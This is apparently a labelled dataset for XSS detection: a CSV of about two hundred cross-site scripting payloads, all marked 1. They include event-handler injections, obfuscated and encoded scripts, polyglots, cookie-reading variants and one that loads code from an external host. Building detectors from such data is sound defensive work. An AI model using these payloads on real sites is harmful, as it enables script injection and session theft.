payload,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""print()""></rp>",1
"<menuitem draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</menuitem>",1
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionstart=alert(1)></meta>",1
<blink onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</blink><input value=clickme>,1
<svg><nextid onload=alert(1)></nextid>,1
<input4 onpointerup=alert(1) style=display:block>AnonKryptiQuz</input4>,1
<noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>,1
"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",1
<html onpointerup=alert(1) style=display:block>AnonKryptiQuz</html>,1
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",1
<colgroup onpointerleave=alert(1) style=display:block>AnonKryptiQuz</colgroup>,1
"<footer oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</footer>",1
"<area oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</area>",1
"<optgroup oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",1
"<cite draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",1
"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",1
<dialog onmousewheel=alert(1) style=display:block>requires scrolling,1
"<shadow onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",1
"<div draggable=""true"" contenteditable>drag me</div><video2 ondragover=alert(1) contenteditable style=display:block>drop here</video2>",1
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,1
"<dd draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",1
"<time onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</time>",1
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable style=display:block>drop here</tbody>",1
<button popovertarget=x>Click me</button><samp onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</samp>,1
"<output draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</output>",1
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",1
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable style=display:block>drop here</blockquote>",1
<caption onpointerout=alert(1) style=display:block>AnonKryptiQuz</caption>,1
"<dfn draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",1
"<meter onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meter>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style=""position:absolute;"" onanimationcancel=""print()""></img>",1
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",1
<button popovertarget=x>Click me</button><script onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</script>,1
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);,1
<ins onmousewheel=alert(1) style=display:block>requires scrolling,1
"<ruby draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</ruby>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=""position:absolute;"" onanimationcancel=""print()""></nav>",1
"<address onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</address>",1
<var onpointerleave=alert(1) style=display:block>AnonKryptiQuz</var>,1
"<form draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</form>",1
%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E,1
"""+onfocus=""prompt(1)""+",1
"&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\""XSS\"")&gt;",1
"<set draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</set>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""print()""></small>",1
<script>alert(1)</script>.htm,1
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""AnonKryptiQuz\\"")&gt;\"";' &gt; out",1
<svg/on%20onload=alert(1)>,1
<u id=x tabindex=1 onfocus=alert(1)></u>,1
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",1
<small id=x tabindex=1 onfocus=alert(1)></small>,1
<ruby contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<rp onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",1
"<map oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</map>",1
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+AnonKryptiQuz=new+MouseEvent(); AnonKryptiQuz.isTrusted=true; AnonKryptiQuz.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(AnonKryptiQuz); </script>,1
"<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>",1
"<tt draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",1
#{{constructor.constructor(alert`AnonKryptiQuz`)()}},1
"<summary draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</summary>",1
"""onpointerover=”alert(‘AnonKryptiQuz’)",1
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1
<link onpointerout=alert(1) style=display:block>AnonKryptiQuz</link>,1
{alert('document.cookie')},1
<center onpointerdown=alert(1) style=display:block>AnonKryptiQuz</center>,1
<area onpointerup=alert(1) style=display:block>AnonKryptiQuz</area>,1
<meta onpointerup=alert(1) style=display:block>AnonKryptiQuz</meta>,1
<img src=x onerror=prompt()>,1
"<xmp draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",1
<multicol onpointerup=alert(1) style=display:block>AnonKryptiQuz</multicol>,1
"'""/><script%20>alert(document.domain)<%2fscript>.css",1
"<marquee draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</marquee>",1
<body onhashchange=alert(1)><a href=#x>click this!#x,1
<body onpointerdown=alert(1) style=display:block>AnonKryptiQuz</body>,1
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",1
"”&gt;&lt;svg onload=alert&amp;#0000000040""1"")&gt;",1
"<blink onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",1
"<noframes onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",1
<IMG SRC=&{javascript:alert(1);};>,1
"<fieldset onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</fieldset>",1
"<fieldset onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>",1
"<embed oncontextmenu=""alert(1)"">AnonKryptiQuz</embed>",1
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=print()></tt>",1
<aside onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</aside><input value=clickme>,1
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",1
"<rb draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</rb>",1
<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>",1
"<code onmouseover=""alert(1)"">AnonKryptiQuz</code>",1
"<pre oncut=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",1
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",1
"<option draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</option>",1
"<nobr onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></nobr>",1
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,1
<object data=/ onload=alert(1)>,1
<video onpointerdown=alert(1) style=display:block>AnonKryptiQuz</video>,1
<picture id=x tabindex=1 onfocus=alert(1)></picture>,1
"<content draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</content>",1
"<keygen onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",1
"<animatetransform draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",1
"<datalist oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",1
"<big onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</big>",1
"<style>@keyframes slidein {}</style><basefont style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></basefont>",1
"<rp onmouseenter=""alert(1)"">AnonKryptiQuz</rp>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""print()""></shadow>",1
"<bdi draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",1
"<aside onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",1
"<multicol onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",1
<section onpointerleave=alert(1) style=display:block>AnonKryptiQuz</section>,1
"<noscript onmouseenter=""alert(1)"">AnonKryptiQuz</noscript>",1
"<td onmousedown=""alert(1)"">AnonKryptiQuz</td>",1
"<dd onmouseenter=""alert(1)"">AnonKryptiQuz</dd>",1
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=print()></hr>",1
"<rb oncut=""alert(1)"" contenteditable>AnonKryptiQuz</rb>",1
"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",1
"<html onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</html>",1
"<audio onmousemove=""alert(1)"">AnonKryptiQuz</audio>",1
<deTAiLs/open/oNtoGGle=confirm()>,1
"<acronym oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<bdi draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",1
<caption onpointerenter=alert(1) style=display:block>AnonKryptiQuz</caption>,1
"<blockquote onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",1
<X onxxx=1,1
"<basefont draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</basefont>",1
<b onpointerup=alert(1) style=display:block>AnonKryptiQuz</b>,1
"<caption draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</caption>",1
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=print()></dl>",1
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionstart=alert(1)></input>",1
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",1
<small onbeforescriptexecute=alert(1)><script>1</script>,1
"<style>@keyframes slidein {}</style><abbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></abbr>",1
<a2 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</a2>,1
"<sub draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",1
<svg onload=prompt%26%23x000000028;document.domain)>,1
"<iframe draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",1
<map onpointerleave=alert(1) style=display:block>AnonKryptiQuz</map>,1
"<script onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</script>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></thead>",1
"<style>@keyframes x{}</style><p style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></p>",1
"<select onmouseover=""alert(1)"">AnonKryptiQuz</select>",1
#<script>alert(1)</script>,1
"<blink oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></u>",1
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,1
"<img src=""javascript:document.vulnerable=true;"">",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></noframes>",1
"<blink onmousemove=""alert(1)"">AnonKryptiQuz</blink>",1
"<source onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</source>",1
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,1
"<iframe src=""vbscript:document.vulnerable=true;"">",1
<svg><noframes onload=alert(1)></noframes>,1
<SCRIPT>alert(1);</SCRIPT>,1
"<span onmousedown=""alert(1)"">AnonKryptiQuz</span>",1
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable style=display:block>drop here</fieldset>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
<iframe2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</iframe2>,1
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
"<samp draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",1
"<div onmousedown=""alert(1)"">AnonKryptiQuz</div>",1
<font contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<li oncontextmenu=""alert(1)"">AnonKryptiQuz</li>",1
&lt;!--&#91;if gte IE 4&#93;&gt;,1
"<;XSS STYLE="";behavior: url(http://ha.ckers.org/xss.htc);"";>;",1
"<summary draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</summary>",1
"<section oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<noscript draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</noscript>",1
"""><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;",1
"<abbr onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></abbr>",1
"<thead onmousedown=""alert(1)"">AnonKryptiQuz</thead>",1
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<input3 onpointerup=alert(1) style=display:block>AnonKryptiQuz</input3>,1
"<bgsound onmouseout=""alert(1)"">AnonKryptiQuz</bgsound>",1
<html onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</html><input value=clickme>,1
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",1
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",1
<multicol onmousewheel=alert(1) style=display:block>requires scrolling,1
"<source onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</source>",1
"<table oncut=""alert(1)"" contenteditable>AnonKryptiQuz</table>",1
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",1
"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=print()></marquee>",1
"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",1
"='><script>alert(""xss"")</script>",1
"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",1
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></frameset>",1
"<style>:target {color:red;}</style><menuitem id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></menuitem>",1
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1
<img src @error=e=$event.composedPath().pop().alert(1)>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",1
"<audio2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></audio2>",1
"<optgroup onmouseleave=""alert(1)"">AnonKryptiQuz</optgroup>",1
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",1
<animate onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</animate>,1
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,1
<button popovertarget=x>Click me</button><optgroup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</optgroup>,1
\u003c,1
';this['\141\154\145\162\164']('\130\123\123');//,1
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable style=display:block>drop here</b>",1
"<style>@keyframes slidein {}</style><big style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></big>",1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></acronym>",1
"<marquee onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",1
"<shadow draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",1
<br contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dialog>",1
%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E,1
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
